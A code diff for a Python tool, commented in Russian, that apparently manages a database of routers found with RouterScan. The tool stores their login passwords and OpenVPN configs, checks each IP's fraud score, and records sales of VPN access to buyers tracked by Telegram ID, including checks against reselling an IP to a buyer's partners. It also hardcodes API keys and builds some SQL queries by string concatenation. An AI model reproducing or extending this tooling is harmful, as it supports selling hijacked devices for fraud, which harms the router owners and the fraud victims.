@@ -4,13 +4,18 @@
 import csv
 import os
 import sys
+import tqdm
 
 import mysql.connector
 from netaddr import *
 import requests
 import json
 import datetime
-
+from tg_rscore import * 
+import tools
+import socket
+import re
+from tools1 import writeTheFile
 
 ########## vars ########
 
@@ -26,7 +31,8 @@ def printALine():       # prints a divider
     return
 
 def getIPQualityScoreAPIKey():        #   выбор АПИ ключа для поиска по сайту www.ipqualityscore.com
-    ipQualityScoreAPIKey = 'BGvBnwvenMqX6BhMYuODspdBG5CncD1s'
+
+    ipQualityScoreAPIKey = 'A3BWEBhVE4f7x7pydHmH429J6CcDH1aD'
     return ipQualityScoreAPIKey
 
 def getIPtoGeplocationAPIKey():       #  выбор АПИ ключа для поиска по сайту ipToGeplocation
@@ -40,30 +46,43 @@ def getIPQualityScore(ipAddr):     # получение risk score с сайта
         ipqualityscore = r["fraud_score"]
         print("IPqualityScore for IP %s detected and equal to %s" % (ipAddr, ipqualityscore))
     else:
+        print("IPqualityScore for IP %s been NOT detected" % (ipAddr))
         ipqualityscore = -1
     return ipqualityscore
 
 def getGetIpIntel(ipAddr):          # получение fraud score с сайта www.getipintel.net
-    now = datetime.datetime.now()
-    nowStr = str(now).replace(' ','').replace(':','').replace('-','').replace('.','')
-    randomEmail = "qwerty" + nowStr[-4:] + '@gmail.com'
-    checkerURL = 'http://check.getipintel.net/check.php?ip=' + ipAddr + '&contact=' + randomEmail + '&format=json'
-    print(checkerURL)
-    r = json.loads(requests.get(checkerURL).text)
-    print(r)
-    if r["status"] == 'success':
-        getipintel = r["result"][:6]
-        print("GetIPintel Score for IP %s detected and equal to %s" % (ipAddr, getipintel))
-    else:
-        getipintel = '-1'
+    #now = datetime.datetime.now()
+    #nowStr = str(now).replace(' ','').replace(':','').replace('-','').replace('.','')
+    #randomEmail = "qwerty" + nowStr[-4:] + '@gmail.com'
+    #checkerURL = 'http://check.getipintel.net/check.php?ip=' + ipAddr + '&contact=' + randomEmail + '&format=json'
+    #print(checkerURL)
+    #r = json.loads(requests.get(checkerURL).text)
+    #print(r)
+    #if r["status"] == 'success':
+    #    getipintel = r["result"][:6]
+    #    print("GetIPintel Score for IP %s detected and equal to %s" % (ipAddr, getipintel))
+    #else:
+    #    getipintel = '-1'
+    getipintel = '-1'
     return getipintel
 
-def writeTheFile(data, filename):     #запись данных из блоб-поля в файл
-    # Convert binary data to proper format and write it on Hard Disk
-    with open(filename, 'w') as file:
-        file.write(str(data))
-        file.close()
-    return
+def getIPtoGeolocationData(IPstr):
+    result = ['','','','','','','','']
+    checkerURL = 'http://ip-to-geolocation.com/api/json/'
+    apiKey = getIPtoGeplocationAPIKey()
+    r = json.loads(requests.get(checkerURL+IPstr+'?key='+apiKey).text)
+    if r["status"] == 'success':
+        result = (r['countryCode'],r['country'],r['region'],r['regionName'],r['city'],r['isp'],r['as'],r['zip'])
+    return result
+
+#def writeTheFile(data, filename):     #запись данных из блоб-поля в файл
+#    # Convert binary data to proper format and write it on Hard Disk
+#    with open(filename, 'wb') as file:
+#    #    file.write(bytes(data))  # encoding="ISO-8859-1" , encoding='UTF-8'
+#    #    file.write(bytes(data, encoding='UTF-8'))   # вот так для Diego
+#        file.write(data)                             # а так для меня
+#        file.close()
+#    return
 
 def mainMenu():     # Главное меню скрипта
     printALine()
@@ -74,7 +93,8 @@ def mainMenu():     # Главное меню скрипта
     print('2 : Work with Data from RouterScan') 
     print('3 : Work with VPN Routers Data')
     print('4 : Sells of VPN Routers')
-    print('5 : (not ready yet)')
+    print('5 : Outside Shop Sells')
+    print('6 : (not ready yet)')
     print('9 : Different service Tools')
     printALine()
     return input()
@@ -109,7 +129,9 @@ def subMenu3():         # menu for Work with VPN Routers Data
     print('1 : Get VPN Routers list for editing / selling')
     print('2 : Submit edited VPN Roters info into online Database')
     print('3 : Upload OpenVPN configs from ./cfg dir into online Database')
-    print('4 : ... < not ready yet >')
+    print('4 : Submit VPN Routers from side source')
+    print('5 : Mark Dead VPNs')
+    print('6 : ... < not ready yet >')
     printALine()
     return input()
 
@@ -120,6 +142,19 @@ def subMenu4():         # menu for Work with VPN Routers Data
     print('0 : Go to Main Menu')
     print('1 : Get a list of VPNs for selling')
     print('2 : Submit list of Sells from file')
+    print('3 : Create DateOrdered List 4 Sells')
+    print('4 : Link Clients')
+    print('5 : ... < not ready yet >')
+    printALine()
+    return input()
+
+def subMenu5():         # menu for Outside Shop Sells
+    printALine()
+    print('=============== Outside Shop Sells =============')
+    printALine()
+    print('0 : Go to Main Menu')
+    print('1 : Prepare IPs for Shops from list')
+    print('2 : ... < not ready yet >')
     print('3 : ... < not ready yet >')
     print('4 : ... < not ready yet >')
     printALine()
@@ -131,9 +166,14 @@ def subMenu9():         # menu for Different service Tools
     printALine()
     print('0 : Go to Main Menu')
     print('1 : Check Database for ipquality & getipintel score')
-    print('2 : Check OpenVPN configs stored in database')
-    print('3 : ... < not ready yet >')
-    print('4 : ... < not ready yet >')
+    print('2 : Сheck and Normalise .OVPN configs in database')
+    print('3 : Download all OpenVPN configs')
+    print('4 : Check ALL IPs in DB for ipqualityscore.com')
+    print('5 : Check Ips Already In Database')
+    print('6 : Check if IP changed by DDNS')
+    print('7 : Delete Dead Routers from DB')
+    print('8 : List All Passwords in DB')
+    print('9 : ... < not ready yet >')
     printALine()
     return input()
 
@@ -383,6 +423,7 @@ def submitVpnRoutersDataToDB():           # запись в базу обраб�
     updateSCANRESSQuery = "UPDATE SCANRESS SET TAKEN = 1, VPNTYPE = %s, VPNLOGPASS = %s, DDNSURL = %s, DDNSREGDATA = %s, NOTES = %s, ISVPN = %s, VPNERROR = %s, NOTACCESSIBLE = %s, NEEDSETUP = %s, APBRIDGE = %s WHERE IP = %s AND PORT = %s"
     selectSCANRESSQuery = "SELECT CountryCode, Country, Region, RegionName, City, ISP, ASCode, ZIP FROM SCANRESS WHERE IP = %s AND PORT = %s"
     selectVPNROUTERSQuery = "SELECT IPADDR FROM VPNROUTERS WHERE IPADDR = '%s'"
+    selectVPNROUTERSQuery2 = "SELECT CountryCode, Country, Region, RegionName, City, ISP, ASCode, ZIP FROM VPNROUTERS WHERE IPADDR = '%s'"
     inserVPNROUTERSQuery = "INSERT INTO VPNROUTERS (IPADDR, PORT, LOGPASS, DEVICE, VPNTYPE, VPNLOGPASS, DDNSURL, DDNSREGDATA, NOTES, CountryCode, Country, Region, RegionName, City, ISP, ASCode, ZIP, OVPNCONFIG, ipqualityscore, getipintel) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"
     updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET PORT = %s, LOGPASS = %s, DEVICE = %s, VPNTYPE = %s, VPNLOGPASS = %s, DDNSURL = %s, DDNSREGDATA = %s, NOTES = %s, CountryCode = %s, Country = %s, Region = %s, RegionName = %s, City = %s, ISP = %s, ASCode = %s, ZIP = %s, OVPNCONFIG = %s, ipqualityscore = %s, getipintel = %s WHERE IPADDR = %s"
     setOfMissedConfigFiles = []
@@ -394,9 +435,10 @@ def submitVpnRoutersDataToDB():           # запись в базу обраб�
         database = dbDBName)
     cursor = dbRS.cursor()
 
-    with open(csvFile, mode='r') as csv_file:
+    with open(csvFile, mode='r', encoding = 'unicode_escape') as csv_file:
         csv_reader = csv.DictReader(csv_file, delimiter=';')
         for row in csv_reader:
+        #    print(row["IP"])
             if ((row["VPN Type"] != '') or (row["VPN login:pass"] != '') or (row["DDNS URL"] != '') or (row["DDNS RegData"] != '') or (row["Notes"] != '') or (row["isVPN"] != '') or (row["VPN error"] != '') or (row["NotAccessible"] != '') or (row["need Setup"] != '') or (row["AP/brige mode"] != '')):
                 updateArgs = (row["VPN Type"], row["VPN login:pass"], row["DDNS URL"], row["DDNS RegData"], row["Notes"], row["isVPN"], row["VPN error"], row["NotAccessible"], row["need Setup"], row["AP/brige mode"], row["IP"], row["Port"])
                 print(updateSCANRESSQuery % updateArgs)
@@ -408,6 +450,11 @@ def submitVpnRoutersDataToDB():           # запись в базу обраб�
                     cursor.execute(selectSCANRESSQuery, selectArgs)   # берем из базы запись с данными адреса для последующей записи ее в таблицу VPNROUTERS
                     result = cursor.fetchone()
                     print(result)
+                    if (result == None):
+                        cursor.execute(selectVPNROUTERSQuery2, row["IP"])
+                        result = cursor.fetchone()
+                        print(selectVPNROUTERSQuery2 % (row["IP"]))
+                        print(result)
                     config_data_file = '' 
                     if row["VPN Type"] == "OpenVPN":
                         try:
@@ -427,6 +474,7 @@ def submitVpnRoutersDataToDB():           # запись в базу обраб�
                         cursor.execute(inserVPNROUTERSQuery, insertArgs)
                         print(row["IP"]+ " successfully inserted into table VPNROUTERS")
                     else:                                             # если есть обновояем данные в записи - так можно заменить пароль от роутера и любые другие данные кроме айпи, так же при этом запишутся свежие значения чекеров риск и фрауд скора
+                        updateArgs = (result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7], config_data_file, getIPQualityScore(row["IP"]), getGetIpIntel(row["IP"]), row["IP"])
                         updateArgs = (row["Port"], row["login:pass"], row["Device"], row["VPN Type"], row["VPN login:pass"], row["DDNS URL"], row["DDNS RegData"], row["Notes"], result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7], config_data_file, getIPQualityScore(row["IP"]), getGetIpIntel(row["IP"]), row["IP"])
     #                    print(updateVPNROUTERSQuery % updateArgs)
                         cursor.execute(updateVPNROUTERSQuery, updateArgs)
@@ -529,9 +577,12 @@ def getVPNRoutersListForEdit():         # получение из базы сп�
     csvList = [['IP','Port','login:pass','Device','VPN Type','VPN login:pass','DDNS URL','DDNS RegData','Notes','CountryCode','Country','Region','RegionName','City','ISP','ASCode','ZIP','ipquality_score','getipintel_score','Sold','Byer','SellLink','SellDate','OldIP','IsVPNDead','isWebLoginDead','RawID']]
     for sRaw in result:
         # sRaw[17] - blob with config, sRaw[23] - sells num
+        # print('processing ', sRaw[0])
         csvList.append(['="'+str(sRaw[0])+'"',sRaw[1],sRaw[2],sRaw[3],sRaw[4],sRaw[5],sRaw[6],sRaw[7],sRaw[8],sRaw[9],sRaw[10],sRaw[11],sRaw[12],sRaw[13],sRaw[14],sRaw[15],sRaw[16],sRaw[18],sRaw[19],sRaw[20],sRaw[21],sRaw[22],sRaw[23],sRaw[25],sRaw[26],sRaw[27],sRaw[28]])
         if sRaw[4] == 'OpenVPN':
-            if len(sRaw[17]) == 0:
+            if (sRaw[17] == None):
+                print('OpenVPN IP ' + sRaw[0] + ' do not have a proper config in database')
+            elif (len(sRaw[17]) == 0):
                 print('OpenVPN IP ' + sRaw[0] + ' do not have a proper config in database')
             else:
                 writeTheFile(sRaw[17], workDirecory + '/cfg/' + sRaw[0] + '.ovpn')
@@ -707,6 +758,39 @@ def submitVpnRoutersEdited():      # загрузка в базу списка �
         print()
     return
 
+def markDeadVPNs():                # берем из файла список айпи и помечаем их в базе как мертвые
+    printALine()
+    print()
+    print('Getting a list of IPs from givet file and mark them as dead VPNs in database')
+    print()
+    fileName = input('Input file name that contains a list of IPs: ')
+
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+
+    updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET ISVPNDEAD = 1, ISWEBLOGINDEAD = 1 WHERE "
+
+    with open(fileName, 'r') as f:
+        for ip in f:
+            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip.strip()) != None:
+                updateVPNROUTERSQuery += "IPADDR = '" + ip.strip() + "' OR "
+        updateVPNROUTERSQuery = updateVPNROUTERSQuery[:-4]
+    print(updateVPNROUTERSQuery)
+    cursor.execute(updateVPNROUTERSQuery)
+    dbRS.commit()
+    cursor.close()
+    dbRS.close()
+    print()
+    printALine()
+    print('All Done!')
+
+    return
+
 def submitSellsFromFile():         # запись в базу только продаж sells.csv (IP;BYER_TG_ID;DATE)
     printALine()
     print()
@@ -715,13 +799,17 @@ def submitSellsFromFile():         # запись в базу только пр�
     print('date in field DATE should be in "YY.MM.DD" format')
     print()
     checkOnly = False
-    if (input('In case you want to check only if such IP possibly been sold to same client then input 1, otherwise just press Enter') == '1'): 
+    if (input('In case you want to check only if such IP possibly been sold to same client then input 1, otherwise just press Enter\n') == '1'): 
         checkOnly = True
     print()
 
     #input('Should we prepare data for this sell locally or put it to ft')
     now = datetime.datetime.now()
     datetimesalt = str(now.year) + str(now.month) + str(now.day) + str(now.hour) + str(now.minute) 
+    if (checkOnly):
+        datetimesalt += "_TEST"
+    else:
+        datetimesalt += "_SELL"
     sellsDir = './sells/'
     sellsFile = 'sells.csv'
     errorIPs = []
@@ -770,10 +858,20 @@ def submitSellsFromFile():         # запись в базу только пр�
         print(sell)
         selectCUSTOMERSQuery = selectCUSTOMERSQueryTemplate + '"' + sell[1] + '"'
         print(selectCUSTOMERSQuery)
+        cursor = dbRS.cursor(buffered=True)
         cursor.execute(selectCUSTOMERSQuery)
         result = cursor.fetchone()
         print(result)
         customerID = result[0] # получили ID клиента
+        customerConnIDs = []   # список айди тех кто работает вместе с этим клиентом
+        customerConnTg_IDs = [] # список айди телеги тех кто работает вместе с этим клиентом
+        if (result[4] != '' and result[4] != None):
+            customerConnIDs = result[4].split(' ')
+            for id in customerConnIDs:
+                cursor.execute("SELECT * FROM CUSTOMERS WHERE ID = " + id)
+                res = cursor.fetchone()
+                customerConnTg_IDs.append(str(res[1]))
+            print(customerConnIDs, customerConnTg_IDs)
 
         selectVPNROUTERSQuery = selectVPNROUTERSQueryTemplate % str(sell[0])
         print(selectVPNROUTERSQuery)
@@ -789,8 +887,9 @@ def submitSellsFromFile():         # запись в базу только пр�
         if result[2] == 0: # если никогда не был продан этот IP пишем в основную таблицу
             updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET SOLD = %s, BYER = %s, SELLDATE = %s, SELLSNUM = %s WHERE ROWID = %s" 
             updateVPNROUTERSargs = ('1',sell[1],sell[2],'1',vpnID)
-            print(updateVPNROUTERSQuery % updateVPNROUTERSargs)
-            cursor.execute(updateVPNROUTERSQuery, updateVPNROUTERSargs)
+            if (not checkOnly):
+                print(updateVPNROUTERSQuery % updateVPNROUTERSargs)
+                cursor.execute(updateVPNROUTERSQuery, updateVPNROUTERSargs)
         else:           # если уже продавался то пишем в отдельную табличку а в VPNROUTERS прибавляем 1 к продажам / 
                         # тут же сначала мы проверим факт того что этот айпи не продавался этому же самому клиенту customerID , sell[1]
             if sell[1] == result[3]:
@@ -802,14 +901,36 @@ def submitSellsFromFile():         # запись в базу только пр�
                 print()
                 doubleSellsList.append(sell[0])
                 continue
-            print('SELECT * FROM SIDESELLS WHERE VPNID = ' + str(vpnID) + ' AND CUSTID = ' + str(customerID))
+            alreadySold = False
+            for tg_id in customerConnTg_IDs:
+                if tg_id == result[3]:
+                    printALine()
+                    print()
+                    print("!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
+                    print("VPN with IP " + sell[0] + " been ALREDY SOLD to " + result[3] + " at " +  str(result[4]))
+                    print("so we cant sell it him again...")
+                    print()
+                    doubleSellsList.append(sell[0])
+                    alreadySold = True
+                    break
+            if alreadySold: continue
+
             try:
-                cursor.execute('SELECT * FROM SIDESELLS WHERE VPNID = ' + str(vpnID) + ' AND CUSTID = ' + str(customerID))
+                if customerConnIDs == []:
+                    print('SELECT * FROM SIDESELLS WHERE VPNID = ' + str(vpnID) + ' AND CUSTID = ' + str(customerID))
+                    cursor.execute('SELECT * FROM SIDESELLS WHERE VPNID = ' + str(vpnID) + ' AND CUSTID = ' + str(customerID))
+                else:
+                    q = 'SELECT * FROM SIDESELLS WHERE VPNID = ' + str(vpnID) + ' AND (CUSTID = ' + str(customerID) + ' OR '
+                    for id in customerConnIDs:
+                        q += 'CUSTID = ' + id + ' OR ' 
+                    q = q[:-4] + ')'
+                    print('q: ', q)
+                    cursor.execute(q)
                 if cursor.fetchone() != None:
                     printALine()
                     print()
                     print("!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
-                    print("VPN with IP " + sell[0] + " been ALREDY SOLD to " + sell[1] + " somedays ago")
+                    print("VPN with IP " + sell[0] + " been ALREDY SOLD to " + sell[1] + " or some of his partners somedays ago")
                     print("so we cant sell it him again...")
                     print()
                     doubleSellsList.append(sell[0])
@@ -825,8 +946,10 @@ def submitSellsFromFile():         # запись в базу только пр�
                 print('updating SELLSNUM field in VPNROUTERS table')
                 print(updateVPNROUTERSQuery)
                 cursor.execute(updateVPNROUTERSQuery)
-        dbRS.commit()
+        if (not checkOnly):
+            dbRS.commit()
         path = sellsDir + sell[1] + '-' + datetimesalt
+        path = path.replace(" ", "_")
         os.makedirs(path, exist_ok=True)
         dataFile = open(path + '/' + sell[1] + '.txt','a')
         dataFile.write(sell[0] + ' | ' + result[6] + ' | ' + result[7] + ' ' + result[8] + ' | ' + result[9] + '\n')
@@ -866,25 +989,33 @@ def toolsMenuCheckScores():        # проверка скора по getipintel
         host = dbServerAddress,
         database = dbDBName)
     cursor = dbRS.cursor()
-    selectQuery = "SELECT ROWID, getipintel, ipqualityscore, IPADDR FROM VPNROUTERS WHERE getipintel = '-1' or ipqualityscore = '-1'"
+    print('Now initialising telegram client for getting score from IPScore bot...')
+    tgclient = initTgClient()
+    selectQuery = "SELECT ROWID, getipintel, ipqualityscore, IPADDR FROM VPNROUTERS WHERE ISVPNDEAD = 0"
+    #selectQuery = "SELECT ROWID, getipintel, ipqualityscore, IPADDR FROM VPNROUTERS WHERE getipintel = '-1' or getipintel = '-0.0' or getipintel = '-0.000' or ipqualityscore = '-1'"
     updateQuery = "UPDATE VPNROUTERS SET ipqualityscore = %s, getipintel = %s WHERE ROWID = %s"
     cursor.execute(selectQuery)
     result = cursor.fetchall()
     for sRaw in result:
-        gIPis = sRaw[1]
+        gIPis = sRaw[1].replace(',','.')
         iPqs = sRaw[2]
-        if sRaw[1] == '-1':
+        if (sRaw[1] == '-1' or sRaw[1] == '-0.0' or sRaw[1] == '-0.000' or 1==1):
             try:
-                gIPis = getGetIpIntel(sRaw[3])
+    #                gIPis = getGetIpIntel(sRaw[3])
+                print('checking IP ', sRaw[3])
+                gIPis = getScore(tgclient, sRaw[3])
             except:
-                print("The answer from getipintel.com was not clear - skipping this ip %s" % sRaw[3])
+                print("The answer from telegram bot is bad - skipping this ip %s" % sRaw[3])
                 continue
-            if gIPis == '-1':
-                print()
-                print("your IP been banned by getipintel.net website. to continue you have to change thi IP. Exiting...")
-                break
+    #            if gIPis == '-1':
+    #                print()
+    #                print("your IP been banned by getipintel.net website. to continue you have to change thi IP. Exiting...")
+    #                break
         if sRaw[2] == '-1':
             iPqs = getIPQualityScore(sRaw[3])
+        if gIPis == ' 💯 ':
+            gIPis = '100'
+        gIPis = str(float(gIPis)/100)[:6]
         updateArgs = (iPqs, gIPis, sRaw[0])
         print(updateQuery % updateArgs)
         cursor.execute(updateQuery, updateArgs)
@@ -892,6 +1023,78 @@ def toolsMenuCheckScores():        # проверка скора по getipintel
     cursor.close()
     dbRS.close()
     print()
+    return
+
+def toolsMenuCheckIPQualityScoresAll():        # проверка скора по ipqualityscore все айпи в базе
+    print()
+    print('here we will check the Database if there any VPN without score (ipqualityscore')
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectQuery = "SELECT ROWID, ipqualityscore, IPADDR FROM VPNROUTERS"
+ #   selectQuery = "SELECT ROWID, ipqualityscore, IPADDR, ISVPNDEAD, ISWEBLOGINDEAD FROM VPNROUTERS"
+ #    selectQuery = "SELECT ROWID, getipintel, ipqualityscore, IPADDR FROM VPNROUTERS WHERE ipqualityscore = '-1'"
+    updateQuery = "UPDATE VPNROUTERS SET ipqualityscore = %s WHERE ROWID = %s"
+    cursor.execute(selectQuery)
+    result = cursor.fetchall()
+    for sRaw in result:
+    #    if sRaw[1] == '-1':
+        if (int(sRaw[0])==0):
+    #    if (int(sRaw[0])==0 or int(sRaw[3])==1 or int(sRaw[4])==1):
+            continue
+        iPqs = getIPQualityScore(sRaw[2])
+        if (int(iPqs) != int(sRaw[1])):
+            updateArgs = (iPqs, sRaw[0])
+            print(updateQuery % updateArgs, ' - old value ', sRaw[1])
+            cursor.execute(updateQuery, updateArgs)
+            dbRS.commit()
+    cursor.close()
+    dbRS.close()
+    print()
+    return
+
+
+def downloadOpenvpnConfigs():         # скачивание конфигов опенвп из базы
+    print()
+    print('here we will download openvpn configs from the Database ... all')
+    print('be very careful - ALL .ovpn file in your /cfg/ directory will be ovewritten with same from database')
+    input('press any key to continue or Ctrl+C for emergency exit...')
+    print('Connecting to online DataBase.... Please Wait....')
+    path = 'cfg/'
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectVPNROUTERSQuery = "SELECT OVPNCONFIG, ROWID, IPADDR FROM VPNROUTERS WHERE VPNTYPE = 'OpenVPN'"
+    cursor.execute(selectVPNROUTERSQuery)
+    result = cursor.fetchall()
+    for row in result:
+        if (row[0] == None):
+            print()
+            printALine
+            print("\n!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
+            print('\n empty config %s !!!!!! skipping\n' % row[2])
+            continue
+        if len(row[0]) == 0:
+            print()
+            printALine
+            print("\n!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
+            print('\n empty config %s !!!!!! skipping\n' % row[2])
+            continue
+        with open(path+row[2]+'.ovpn','wb') as f:
+            f.write(row[0])
+            print(path+row[2]+'.ovpn written')
+    cursor.close()
+    dbRS.close()
+    print()
+    printALine()
+    print('Downloading finished!')
     return
 
 def checkOpenvpnConfigs():         # проверк состояния конфигов опенвп в базе
@@ -917,7 +1120,7 @@ def checkOpenvpnConfigs():         # проверк состояния конф�
             print("\n!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
             print('\n empty config %s !!!!!! skipping\n' % row[2])
             continue
-        if row[0][-7:].find("\n\\'\"'\n\n") != -1:
+        if row[0][-7:].find(b"\n\\'\"'\n\n") != -1:
             newcfg = row[0][:-6]
             updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET OVPNCONFIG = %s WHERE ROWID = %s"
             updateArgs = (newcfg,str(row[1]))
@@ -926,7 +1129,7 @@ def checkOpenvpnConfigs():         # проверк состояния конф�
             print('Config for ' + row[2] + ' fixed')
             continue
 
-        if row[0][-3:].find("\n'\n") != -1:
+        if row[0][-3:].find(b"\n'\n") != -1:
             newcfg = row[0][:-2]
             updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET OVPNCONFIG = %s WHERE ROWID = %s"
             updateArgs = (newcfg,str(row[1]))
@@ -946,6 +1149,7 @@ def checkOpenvpnConfigs():         # проверк состояния конф�
             print('Config for ' + row[2] + ' fixed')
             continue
         if row[0][0] == 'b':
+            newcfgList = []
             print('processing row ID ' + str(row[1]))
             if row[0][0:2] == "b'":
                 newcfg = row[0][2:]
@@ -972,7 +1176,7 @@ def checkOpenvpnConfigs():         # проверк состояния конф�
 
     return
 
-def uploadOpenVPNconfigs():
+def uploadOpenVPNconfigs():         # загрузка в базу всех конфигов из папки /cfg
     input('This procedure will upload ALL the configs from local directory ./cfg into online database. \n And replase all existing configs in database \n Please be very careful with it. Better delete from that folder all configs that you unsure with. \n And press any key to continue')
     print('Connecting to online DataBase.... Please Wait....')
     dbRS = mysql.connector.connect(
@@ -982,18 +1186,399 @@ def uploadOpenVPNconfigs():
         database = dbDBName)
     cursor = dbRS.cursor()
 
+    pbar = tqdm.tqdm(total=len(os.listdir("./cfg")))
+
     for fileName in os.listdir("./cfg"):
         if fileName.endswith(".ovpn"):
+ #            print(workDirecory+"/cfg/"+fileName)
             cfgData = open(workDirecory+"/cfg/"+fileName[:-5]+".ovpn", 'r').read() # читаем файл конфига 
-            updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET OVPNCONFIG = %s WHERE IPADDR = %s"
+            updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET OVPNCONFIG = %s WHERE IPADDR = %s AND VPNTYPE = 'OpenVPN'"
             updateArgs = (str(cfgData),fileName[:-5])
             cursor.execute(updateVPNROUTERSQuery,updateArgs)
             dbRS.commit()
             print('Config for ' + fileName[:-5] + ' saved to DB')
+        pbar.update(1)
+    cursor.close()
+    dbRS.close()
+    pbar.close()
+    return
+
+def submitVpnRoutersSideSource():         # загрузка в базу данных по роутерам полученным иным способом
+                                          # .csv файл с данными должен иметь колонки
+                                          #  IP | Port | Authorization | Device | VPN Type | VPN/LOGIN | DDNS
+    input('This procedure will get data from .csv file with columns "IP | Port | Authorization | Device | VPN Type | VPN/LOGIN | DDNS"\n')
+    csvFileName = input('Input filename:\n')
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectVPNROUTERSQuery = "SELECT IPADDR, ROWID FROM VPNROUTERS WHERE IPADDR = %s AND VPNTYPE = %s"
+ #    updateQuery = "UPDATE VPNROUTERS SET ipqualityscore = %s, getipintel = %s WHERE ROWID = %s"
+    inserVPNROUTERSQuery = "INSERT INTO VPNROUTERS (IPADDR, PORT, LOGPASS, DEVICE, VPNTYPE, VPNLOGPASS, DDNSURL, CountryCode, Country, Region, RegionName, City, ISP, ASCode, ZIP, ipqualityscore) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"
+    print('Reading file ', csvFileName)
+    with open(csvFileName, encoding="ISO-8859-1") as csvfile:
+            readCSV = csv.reader(csvfile, delimiter=';')
+            for row in readCSV:
+                if (row[0].find('IP') != -1) or (row[0].strip() == ''): continue
+                print(selectVPNROUTERSQuery % (row[0],row[4]))
+                cursor.execute(selectVPNROUTERSQuery, (row[0],row[4]))
+                result = cursor.fetchone()
+                if (result != None):
+                    print('IP ', row[0], 'with type ', row[4], ' уже присутствует в базе !!!!!!!!')
+                    continue  
+                geoData = getIPtoGeolocationData(row[0])
+                ipqualityscore = getIPQualityScore(row[0])                 
+                insertArgs = (row[0],row[1],row[2],row[3],row[4],row[5],row[6],geoData[0],geoData[1],geoData[2],geoData[3],geoData[4],geoData[5],geoData[6],geoData[7],ipqualityscore)
+                cursor.execute(inserVPNROUTERSQuery,insertArgs)
+                print('IP ', row[0], ' успешно добавлен в базу')
+                dbRS.commit()
+    cursor.close()
+    dbRS.close()
+    return
+
+def createDateOrderedList4Sells():
+    return
+
+def checkIPsAlreadyInDatabase():      # проверка есть ли айпи из списка в базе (среди роутеров)
+    input('This procedure will check if IPs already in Database or not\n')
+    csvFileName = input('Input IPs filename:\n')
+    print('Connecting to online DataBase.... Please Wait....')
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+    selectVPNROUTERSQuery = "SELECT IPADDR, ROWID FROM VPNROUTERS WHERE IPADDR = '"
+    inDBlist = []
+    noInDBlist = []
+    with open(csvFileName, encoding="ISO-8859-1") as csvfile:
+        readCSV = csv.reader(csvfile, delimiter=';')
+        for row in readCSV:
+            if (row[0].find('IP') != -1) or (row[0].strip() == ''): continue
+            print(selectVPNROUTERSQuery + row[0] + "'")
+            cursor.execute(selectVPNROUTERSQuery + row[0] + "'")
+            result = cursor.fetchone()
+            if (result != None):
+                inDBlist.append(row[0])
+                print('IP ', row[0], ' уже присутствует в базе !!!!!!!!')
+            else:
+                noInDBlist.append(row[0])
+                print('IP ', row[0], ' отсутствует в базе')
+    print('\n Now writing IPs those not found in Database back to file, ', csvFileName, '\n')
+    with open(csvFileName, 'w', encoding="ISO-8859-1") as csvfile:
+        writer = csv.writer(csvfile, delimiter=';')
+        writer.writerow(["IP"])
+        for row in noInDBlist:
+            writer.writerow([row])
 
     cursor.close()
     dbRS.close()
+    
+    return
 
+def checkAndNormaliseOVPNconfigsInDatabase():   # Приведение всех конфигов в базе к единому виду и параллельная проверка 
+    print('Connecting to online DataBase.... Please Wait....')
+    tmp_path = 'tmp'
+    try:
+        os.mkdir(tmp_path)
+    except:
+        pass
+
+    dbRS = mysql.connector.connect(
+        user = dbUserName,
+        password = dbPassword,
+        host = dbServerAddress,
+        database = dbDBName)
+    cursor = dbRS.cursor()
+
+    selectVPNROUTERSQuery = "SELECT OVPNCONFIG, ROWID, IPADDR, DEVICE FROM VPNROUTERS WHERE VPNTYPE = 'OpenVPN' AND ISVPNDEAD = 0"# + " AND CountryCode = 'RU'" # DEVICE LIKE '%Belkin%'"# + " AND Region = 'ID'"
+    updateVPNROUTERSQuery = "UPDATE VPNROUTERS SET OVPNCONFIG = %s, PROTO = %s, ADAPTER =%s, PLATFORM =%s WHERE ROWID = %s"
+    cursor.execute(selectVPNROUTERSQuery)
+    result = cursor.fetchall()
+
+    pbar = tqdm.tqdm(total=len(result))
+
+    for row in result:
+        tuntap = ''
+        proto = ''
+        tls0 = False
+        platform = 'W'
+        if ((row[0] == None) or (len(row[0]) == 0)):
+            print()
+            printALine
+            print("\n!!!!!ATTENSION -> AHTUNG -> SOS -> PAMAGITE!!!!")
+            print('\n empty config %s !!!!!! skipping\n' % row[2])
+            continue
+        writeTheFile(row[0],tmp_path+'/'+row[2]+'.ovpn')
+    #    with open(tmp_path+'/'+row[2]+'.ovpn','wb') as f:
+    #        f.write(row[0])
